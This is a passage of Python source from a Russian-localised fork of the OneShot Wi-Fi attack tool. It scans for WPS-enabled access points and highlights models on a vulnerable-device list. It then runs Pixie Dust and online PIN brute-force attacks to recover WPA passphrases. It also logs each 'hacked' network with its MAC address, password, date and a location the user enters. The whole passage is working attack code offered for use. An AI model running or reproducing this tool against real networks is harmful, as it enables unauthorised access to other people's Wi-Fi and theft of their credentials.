            print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} WPS PIN: '{Fore.LIGHTGREEN_EX}{wpa_psk}{Fore.RESET}'")
        
        #print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} WPS PIN: '{Fore.LIGHTGREEN_EX}{wps_pin}{Fore.RESET}'")

        if Hide_Password_AP == "True":
            Hiden_WPA_PSK = '*' * len(wpa_psk)
            print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} WPA PSK(Пароль): '{Fore.LIGHTGREEN_EX}{Hiden_WPA_PSK}{Fore.RESET}'")
        elif Hide_Password_AP == "Half":
            half_length = len(wpa_psk) // 2
            Hiden_Half_WPA_PSK = '*' * half_length + wpa_psk[half_length:]
            print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} WPA PSK(Пароль): '{Fore.LIGHTGREEN_EX}{Hiden_Half_WPA_PSK}{Fore.RESET}'")
        else:
            print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} WPA PSK(Пароль): '{Fore.LIGHTGREEN_EX}{wpa_psk}{Fore.RESET}'")
        
        #print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} WPA PSK(Пароль): '{Fore.LIGHTGREEN_EX}{wpa_psk}{Fore.RESET}'")

        print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} AP SSID(WiFi-Имя): '{Fore.LIGHTGREEN_EX}{essid}{Fore.RESET}'")
        print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} AP BSSID(WiFi-MAC): '{Fore.LIGHTGREEN_EX}{bssid}{Fore.RESET}'")
        



        #> Работа с дерикториями и папками 
        #Проверяет какая система, и от этого уже будет указан путь сохранения.
        if OS_Target == "NetHunter":
            folder_OSP = "/sdcard/nh_files/OneShotPin_Log"
        
        elif OS_Target == "Kali":
            folder_OSP = "/home/kali/OneShotPin_Log"
        
        else:
            folder_OSP = "root/OneShotPin_Log"

        #Проверяет есть ли папка если нету то создается папка!
        print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}F{Fore.LIGHTRED_EX}S{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Поиск папки '{Fore.LIGHTCYAN_EX}OneShotPin_Log{Fore.RESET}'... ")
        if not os.path.exists(folder_OSP):
            print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}F{Fore.LIGHTRED_EX}S{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Создание папки '{Fore.LIGHTCYAN_EX}OneShotPin_Log{Fore.RESET}'... ")
            os.makedirs(folder_OSP)
        #< Работа с дерикториями и папками 


        
        #> Проверка есть ли ранее взломанная wifi сеть, по MAC адрессу.
        def search_wifi_mac(bssid):
            
            formatted_bssid = bssid.replace(":", "-")

            for filename in os.listdir(folder_OSP):
                if formatted_bssid in filename:
                    return filename
                
            return None
        #< Проверка есть ли ранее взломанная wifi сеть, по MAC адрессу.
        


        #> Сохранение лога
        def save_log(wps_pin, wpa_psk, essid, bssid, type_save):
            current_datetime = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            current_datetime_text = datetime.datetime.now().strftime("%Y-%m-%d / %H-%M-%S")
            formatted_bssid_file = bssid.replace(":", "-")

            if type_save == "Update_new_wn":
                file_name = f"{formatted_bssid_file}=UP={current_datetime}.OSP_Complete"
            elif type_save == "Save_new_wn":
                file_name = f"{formatted_bssid_file}={current_datetime}.OSP_Complete"
            else:
                #ER02
                print(f"\n \n \n{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Произошла ошибка в скрипте ER02!!! \n{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Произошла ошибка в скрипте ER02!!! \n{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Произошла ошибка в скрипте ER02!!!")
                exit()
            
            file_path = os.path.join(folder_OSP, file_name)
        
            location_hack = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}F{Fore.LIGHTRED_EX}S{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Введите локацию взлома :{Fore.LIGHTCYAN_EX} ")
            print(f"{Fore.RESET}")
            
            if type_save == "Update_new_wn":
                content = [
                    f"Status: Повторный взлом | Repeated hacking ",
                    f"WPS PIN: {wps_pin}",
                    f"WPA PSK(Password): {wpa_psk}",
                    f"AP SSID(WiFi-Name): {essid}",
                    f"AP BSSID(WiFi-MAC): {bssid}",
                    f"Date/Time : {current_datetime_text}",
                    f"Location: {location_hack}"
                ]
            elif type_save == "Save_new_wn":
                content = [
                    f"Status: Впервые взломано | Initially hacked ",
                    f"WPS PIN: {wps_pin}",
                    f"WPA PSK(Password): {wpa_psk}",
                    f"AP SSID(WiFi-Name): {essid}",
                    f"AP BSSID(WiFi-MAC): {bssid}",
                    f"Date/Time : {current_datetime_text}",
                    f"Location: {location_hack}"
                ]
            else:
                #ER03
                print(f"\n \n \n{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Произошла ошибка в скрипте ER03!!! \n{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Произошла ошибка в скрипте ER03!!! \n{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Произошла ошибка в скрипте ER03!!!")
                exit()
            
            

            with open(file_path, 'w') as file:
                for line in content:
                    file.write(line + '\n')
            print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}F{Fore.LIGHTRED_EX}S{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Результат взлома записан в файл '{Fore.LIGHTCYAN_EX}{folder_OSP}/{file_name}{Fore.RESET}'... ")
       
        #< Сохранение лога



        Scan_Files_OSP = search_wifi_mac(bssid)

        if Scan_Files_OSP:
            print(f"\n {Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}F{Fore.LIGHTRED_EX}S{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Найдено ранее взломаная сеть: {Fore.LIGHTCYAN_EX}'{Scan_Files_OSP}'{Fore.RESET} \n")
            print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}F{Fore.LIGHTRED_EX}S{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Сохранить новый лог? {Fore.RESET}")
            print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}F{Fore.LIGHTRED_EX}S{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Доступные варианты: {Fore.LIGHTCYAN_EX}y{Fore.RESET}, {Fore.LIGHTCYAN_EX}n{Fore.RESET}, {Fore.LIGHTCYAN_EX}yes{Fore.RESET}, {Fore.LIGHTCYAN_EX}no{Fore.RESET}, {Fore.LIGHTCYAN_EX}д{Fore.RESET}, {Fore.LIGHTCYAN_EX}н{Fore.RESET}")
            select_1 = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}F{Fore.LIGHTRED_EX}S{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} >> {Fore.LIGHTCYAN_EX}")
            
            if select_1 in ["y", "yes", "Y", "Yes", "YES", "yES", "д", "да", "Д", "Да", "ДА", "дА"]:
                print(f"{Fore.RESET}")
                type_save = "Update_new_wn"
                save_log(wps_pin, wpa_psk, essid, bssid, type_save)
            elif select_1 in ["n", "no", "not", "N", "No", "Not", "н", "не", "нет", "Н", "Не", "Нет"]:
                print(f"{Fore.RESET}")
                print(f"\n{Fore.LIGHTBLUE_EX}Выход...")

            else:
                print(f"{Fore.RESET}")
        
        elif Scan_Files_OSP == None:
            type_save = "Save_new_wn"
            save_log(wps_pin, wpa_psk, essid, bssid, type_save)
        
        else:
            #ER1
            print(f"\n \n \n{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Произошла ошибка в скрипте ER1!!! \n{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Произошла ошибка в скрипте ER1!!! \n{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Произошла ошибка в скрипте ER1!!!")
            exit()

        
        

        
        # < FireSoft

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Учетные данные сохранены в {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print(f'[i] PIN сохранен в {filename}')

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f'Сгенерированные PIN-коды для {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = input('Выберите PIN-код: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print('Неверный номер')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            print('[i] Выбран единственый вероятный PIN:', pin['name'])
            pin = pin['pin'] 
        else:
            return None
        return pin

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)   # Clean the pipe 
        if pbc_mode:
            if bssid:
                print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Запуск соединения  по кнопке WPS с точкой доступа {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Запуск соединения по кнопке WPS…")
                cmd = 'WPS_PBC'
        else:
            print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Пробуем PIN {Fore.LIGHTCYAN_EX}'{pin}'{Fore.RESET}…")
            cmd = f'WPS_REG {bssid} {pin}'
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not pin:
            if pixiemode:
                try:
                    # Try using the previously calculated PIN
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if input(f"{Fore.GREEN}[{Fore.YELLOW}?{Fore.GREEN}]{Fore.RESET} Использовать ранее вычисленный PIN-код {Fore.LIGHTCYAN_EX}{t_pin}{Fore.RESET}? [n/Y] ").lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                # If not pixiemode, ask user to select a pin from the list
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nВыход…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid, bssid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                # Try to remove temporary PIN file
                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print(f'{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Недостаточно данных для запуска атаки Pixie Dust.')
                return False
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        """
        @f_half — 4-character string
        """
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} Найдена первая половина')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print(f'{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Сбой транзакции WPS, повторная попытка с последним PIN-кодом.')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}-{Fore.GREEN}]{Fore.RESET} Первая половина не найдена.')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        """
        @f_half — 4-character string
        @s_half — 3-character string
        """
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print(f'{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Сбой транзакции WPS, повторная попытка с последним PIN-кодом.')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            # Trying to restore previous session
            try:
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'r') as file:
                    if input(f"{Fore.GREEN}[{Fore.YELLOW}?{Fore.GREEN}]{Fore.RESET} Восстановить предыдущую сессию для {Fore.LIGHTYELLOW_EX}{bssid}{Fore.RESET}? [n/Y] ").lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("\nВыход…")
            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}i{Fore.GREEN}]{Fore.RESET} Сессия сохранена в {filename}')
            if args.loop:
                raise KeyboardInterrupt

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        self.cleanup()


class WiFiScanner:
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        """Parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print(f'{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Error: \n {line}')
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # Filtering non-WPS networks
        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        # Sorting by signal level
        networks.sort(key=lambda x: x['Level'], reverse=True)

        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        # Printing scanning results as table
        def truncateStr(s, length, postfix='…'):
            """
            Truncate string with the specified length
            @s — input string
            @length — length of output string
            """
            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text, color=None):
            """Returns colored text"""
            if color:
                if color == 'green':
                    text = '\033[92m{}\033[00m'.format(text)
                elif color == 'red':
                    text = '\033[91m{}\033[00m'.format(text)
                elif color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Possibly vulnerable', color='green'),
                colored('WPS locked', color='red'),
                colored('Already stored', color='yellow')
            ))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = '{} {}'.format(network['Model'], network['Model number'])
            essid = truncateStr(network['ESSID'], 25)
            deviceName = truncateStr(network['Device name'], 27)
            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
                number, network['BSSID'], essid,
                network['Security type'], network['Level'],
                deviceName, model
                )
            if (network['BSSID'], network['ESSID']) in self.stored:
                print(colored(line, color='yellow'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif self.vuln_list and (model in self.vuln_list):
                print(colored(line, color='green'))
            else:
                print(line)

        return network_list

    def prompt_network(self) -> str:
        networks = self.iw_scanner()
        if not networks:
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}-{Fore.GREEN}]{Fore.RESET} Не найдены сети с поддержкой WPS.')
            return
        while 1:
            try:
                networkNo = input('Select target (press Enter to refresh): ')
                if networkNo.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkNo) in networks.keys():
                    return networks[int(networkNo)]['BSSID']
                else:
                    raise IndexError
            except Exception:
                print('Invalid number')

    def scan_network(self) -> str:
        networks = self.iw_scanner()
        if not networks:
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}-{Fore.GREEN}]{Fore.RESET} Не найдены сети с поддержкой WPS.')
            return

def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return True
    else:
        return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    return """
OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg | FireSoft 0.0.5 - 2024.04 

%(prog)s <параметр>

Обязательные параметры:
    -i, --interface=<wlan0>  : Имя используемого интерфейса

Дополнительные параметры:
    -b, --bssid=<mac>        : BSSID целевой точки доступа
    -p, --pin=<wps pin>      : Использовать указанный PIN-код (произвольная строка или 4/8-значный PIN)
    -K, --pixie-dust         : Запустить атаку Pixie Dust
    -B, --bruteforce         : Запустить атаку на подбор пароля онлайн
    --push-button-connect    : Запустить соединение по кнопке WPS

Advanced arguments:
    -d, --delay=<n>          : Установить задержку между попытками ввода PIN-кода [0]
    -w, --write              : Записать учетные данные AP в файл при успешной атаке
    -F, --pixie-force        : Запустить Pixiewps с опцией --force (полный перебор диапазона)
    -X, --show-pixie-cmd     : Всегда выводить команду Pixiewps
    --vuln-list=<filename>   : Использовать пользовательский файл с перечнем уязвимых устройств ['vulnwsc.txt']
    --iface-down             : Отключить сетевой интерфейс по завершении работы
    -l, --loop               : Выполнять в цикле
    -s  --scan               : Выполнить только одно сканирование сетей
    -r, --reverse-scan       : Изменить порядок сетей в списке сетей. Полезно на устройствах с небольшими экранами
    -v, --verbose            : Подробный вывод

Пример:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description=f'{Fore.LIGHTCYAN_EX}OneShotPin 0.0.2{Fore.RESET} (c) 2017 rofl0r, modded by drygdryg | {Fore.YELLOW}Fire{Fore.LIGHTRED_EX}Soft{Fore.RESET} {Fore.LIGHTGREEN_EX}0.0.5 - 2024.04{Fore.RESET}',
        epilog='Пример: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        help='Имя используемого интерфейса.'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID целевой точки доступа'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Использовать указанный PIN-код (произвольная строка или 4/8-значный PIN)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Запустить атаку Pixie Dust'
        )
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Запустите Pixiewps с опцией --force (полный перебор)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Всегда выводит действия Pixiewps'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Запуск онлайн атаки перебора'
        )
    parser.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Запустить подключение по кнопке WPS'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Установить задержку между попытками ввода PIN-кода'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Записать учетные данные в файл при успешном выполнении'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Отключить сетевой интерфейс по завершении работы'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='Использовать пользовательский файл со списком уязвимых устройств'
    )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Запустить в цикле'
    )
    parser.add_argument(
        '-s', '--scan',
        action='store_true',
        help='Выполнить только одно сканирование сетей'
    )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='Изменить порядок сетей в списке сетей на обратный. Полезно на небольших дисплеях.'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Подробный вывод'
        )

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Данный скрипт может быть запущен от Python 3.6 и выше!")
    if os.getuid() != 0:
        die(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.RESET} Запустите скрипт с Root правами!")

    if not ifaceUp(args.interface):
        die('Не удалось включить интерфейс(wlan) "{}"'.format(args.interface))

    while True:
        try:
            companion = Companion(args.interface, args.write, print_debug=args.verbose)
            if args.pbc:
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    scanner = WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} BSSID не указан (--bssid) — сканирование доступных сетей')
                    if not args.scan:
                        args.bssid = scanner.prompt_network()
                    else:
                        args.bssid = scanner.scan_network()
                if args.bssid:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                    args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input("\n[?] Выйти из сценария (в противном случае продолжить сканирование точек доступа)? [N/y] ").lower() == 'y':
                    print(f"{Fore.LIGHTBLUE_EX}Выход...")
                    break
                else:
                    args.bssid = None
            else:
                print(f"\n{Fore.LIGHTBLUE_EX}Выход...")
                break

    if args.iface_down:
        ifaceUp(args.interface, down=True)
